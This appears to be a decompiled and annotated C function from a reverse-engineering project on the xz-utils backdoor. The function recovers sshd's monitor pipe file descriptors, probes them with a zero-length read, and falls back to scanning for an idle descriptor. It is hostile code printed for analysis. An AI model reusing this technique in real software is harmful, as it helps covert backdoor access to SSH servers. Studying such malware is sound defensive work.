// /home/kali/xzre-ghidra/xzregh/107C60_sshd_get_client_socket.c
// Function: sshd_get_client_socket @ 0x107C60
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_get_client_socket(global_context_t * ctx, int * pSocket, int socket_index, SocketMode socket_direction)


/*
 * AutoDoc: Prefers sshd’s monitor struct when it has already been located: the helper validates that the pointer is still mapped, selects `child_to_monitor_fd` or `monitor_to_child_fd` based on the requested direction, and probes the descriptor with a zero-length `read()` (retrying on EINTR but rejecting EBADF). If the monitor is missing or the fd is dead it falls back to `sshd_get_usable_socket` and hands back the Nth idle descriptor instead.
 */
#include "xzre_types.h"

BOOL sshd_get_client_socket
               (global_context_t *ctx,int *pSocket,int socket_index,SocketMode socket_direction)

{
  monitor *monitor_candidate;
  BOOL monitor_mapped;
  ssize_t read_result;
  int *errno_ptr;
  libc_imports_t *libc_imports;
  int client_fd;
  u8 read_probe_buf[9];
  
  if (((ctx == (global_context_t *)0x0) ||
      (libc_imports = ctx->libc_imports, libc_imports == (libc_imports_t *)0x0)) || (pSocket == (int *)0x0)) {
    return FALSE;
  }
  if (ctx->monitor_struct_slot != (monitor **)0x0) {
    // AutoDoc: Use the recovered monitor struct when one was published through `global_context_t`.
    monitor_candidate = *ctx->monitor_struct_slot;
    // AutoDoc: Skip the monitor path entirely if the cached pointer is unmapped or stale.
    monitor_mapped = is_range_mapped((u8 *)monitor_candidate,4,ctx);
    if (monitor_mapped != FALSE) {
      // AutoDoc: DIR_WRITE expects the child→monitor pipe; DIR_READ grabs the monitor→child side.
      if (socket_direction == DIR_WRITE) {
        client_fd = monitor_candidate->child_to_monitor_fd;
      }
      else {
        if (socket_direction != DIR_READ) {
          return FALSE;
        }
        client_fd = monitor_candidate->monitor_to_child_fd;
      }
      read_probe_buf[0] = 0;
      libc_imports = ctx->libc_imports;
      if (((-1 < client_fd) && (libc_imports != (libc_imports_t *)0x0)) &&
         ((libc_imports->read != (pfn_read_t)0x0 &&
          (libc_imports->__errno_location != (pfn___errno_location_t)0x0)))) {
        do {
          // AutoDoc: Issue a zero-length read to confirm the fd is alive, retrying on EINTR but treating EBADF as fatal.
          read_result = (*libc_imports->read)(client_fd,read_probe_buf,0);
          errno_ptr = (*libc_imports->__errno_location)();
          if (-1 < (int)read_result) goto LAB_00107d34;
        } while (*errno_ptr == 4);
        if (*errno_ptr != 9) {
LAB_00107d34:
          *pSocket = client_fd;
          return TRUE;
        }
      }
    }
    libc_imports = ctx->libc_imports;
  }
  // AutoDoc: Fall back to the brute-force fd scanner when the monitor probe failed.
  monitor_mapped = sshd_get_usable_socket(pSocket,socket_index,libc_imports);
  return monitor_mapped;
}

